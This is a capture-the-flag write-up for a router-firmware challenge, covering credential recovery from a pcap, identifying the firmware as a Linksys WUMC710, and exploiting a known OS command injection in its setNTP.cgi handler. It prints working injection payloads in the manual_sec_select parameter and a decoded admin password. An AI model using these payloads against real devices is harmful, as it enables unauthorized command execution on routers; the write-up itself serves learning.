### Category: Web, Pwn, Reversing

Okay, this was a very interesting challenge, and my solution was sort of an uintended solution. 

PS. I do feel this challenge should've been worth more points.

## TLDR (Intended Solution);

1. Extract credentials from the pcap
2. Use the credentials to login to the webserver; which is run using the firmware.
3. Reverse the firmware to find a vulnerability. which was an OS Injection.
4. Cannot get a reverse shell, or an outbound connection. So cp'ed flag to the server root directory, and renamed it to '.js'. Then accessed it via the webserver.

I definitely would like to know if any teams did this challenge in the intended way.

### My Solution

We have 2 files provided to us. 1. firmware.bin 2. traffic.pcap

From the traffic.pcap, after doing a "Follow > TCP Stream" we find :

`"YWRtaW46YWRtaW4="` decodes to `admin:admin` which does not work. So we need to find the credentials.

In stream 2

`YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=` decodes to `admin:8^hj%u$40D8b8$lxD47n0` which works.

We use these credentials to login to the webserver. We can see that the webserver is running on the firmware.

It's some router administration page. After sometime of poking around the site, I didn't see anything interesting. So decided to reverse the firmware instead.

----

I used the [firmware-mod-kit](https://github.com/rampageX/firmware-mod-kit) to extract a file system with all the binaries and executables running on the system.

From the pcap file, we also know that the traffic is served via `httpd`.

---

Loaded up `rootfs/usr/sbin/httpd` in Ghidra, and started reversing to potentially find any bug that I could exploit. 

Now, here's the catch. I couldn't possibly find any bug that I could exploit. 

So, I checked the wireshark again for any other clues? and boy did I find something!

The name `WUMC710` felt sus, so I looked around. 

Turns out `WUMC710` is a media-connector, a router of sorts, which is exactly what our challenge is running.

---

I did have a conversation with the author, turns our he missed editing `WUMC710` from the pcap, lmao xD, and I was not intended to find this particular information.

---

I also downloaded the [firmware for `WUMC710`](https://www.linksys.com/support-article?articleNum=148656) and extracted it.

The first thing I did was, diffe'd the `strings` found in challenge httpd and the official one. 

Guess what?

```

Lol, only the names differ.

Even a binary diff over the exectuables showed the same difference.

Turns out, they are the exact same binaries, with same address, functionalities, etc.

---

A quick google search for `WUMC710 vulnerabilities` led me to [this](https://nvd.nist.gov/vuln/detail/CVE-2022-43971).

From the above link :

1. There's an OS Injection vulnerability.

_AND_

2. [https://youtu.be/RfWVYCUBNZ0](https://youtu.be/RfWVYCUBNZ0) 

![image](ReachableFruit/7.png)

This is it! 

The CVE mentioned the bug is in the `do_setNTP()` function. 

Moreover, the author of the video even calls _finding_ the OS injection vulnerability as a __low hanging fruit__ .

But I still couldn't find the bug.!! AAh, that was frustrating!! I couldn't even find `do_setNTP()` function in the binary.

---

So after a conversation with the challenge author, I found out the firmware source code could be open source.

Since reversing wasn't leading my anywhere, I tried to find the source code. 

Bingo! 

__[Source Code](https://sourceforge.net/projects/officiallinksysfirmware/files/wumc710/)__

---

Here on, it was a pretty straight forward challenge.

(Code truncated to show only the important pieces)

```
	{"setNTP.cgi*", "text/html", no_cache, do_apply_post, do_setNTP, do_auth },		

```

```
static void do_setNTP(char *url, FILE *stream)
{
    ...
	setNTP(stream, NULL, NULL, 0, url, path, query);
    ...
}
```
```
static int setNTP(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg,
	     char_t *url, char_t *path, char_t *query)
{
    ...
	if(!strcmp(timeTag, "NTP")){
	...
	}else if  (!strcmp(timeTag, "manual")){
    ...
		setDateTime(wp, &path, &query);
	...
	}
	return 0;
}
```
```
static void setDateTime(webs_t wp, char_t *path, char_t *query)
{
    ...
	second = websGetVar(wp, T("manual_sec_select"), T(""));

	sprintf(cmd_sys,"date -s %s%s%s%s%s.%s", month, day, hour, minute, year, second); //Salim
	printf("cmd_sys=%s \n",cmd_sys);
	system(cmd_sys);
    ...
}
```

BINGO!

So, the attack path was clear.

1. Make a `POST`request to `setNTP.cgi`

2. Include the following parameters

    a. timeTag=manual (so `setDateTime` gets called)
    
    b.  command injection via `manual_sec_select` parameter.

---

### Exploitation

To confirm command injection,

```
timeTag=manual&manual_sec_select=; sleep 2;
```

---

But I couldn't work `wget` to work. So, I assume, outbount connections are bound by some sort of firewall.

Since, we can access `.js` scripts. I simply moved `/flag` to `/www/x0rc3r3rs.js` and accessed it via the browser.

```
timeTag=manual&manual_sec_select=; cp /flag /wwww/x0rc3r3rs.js;
```

## After thoughts

After a further conversation with the challenge author, apparently, Ghidra was a major culprit in the process! 

It failed to disassemble, and hence find the `do_setNTP()`, `setNTP()` functions, even the xref to `system()` in `setDateTime()` was missing! 

I'll try to solve this in Binary Ninja someday ðŸ¤·
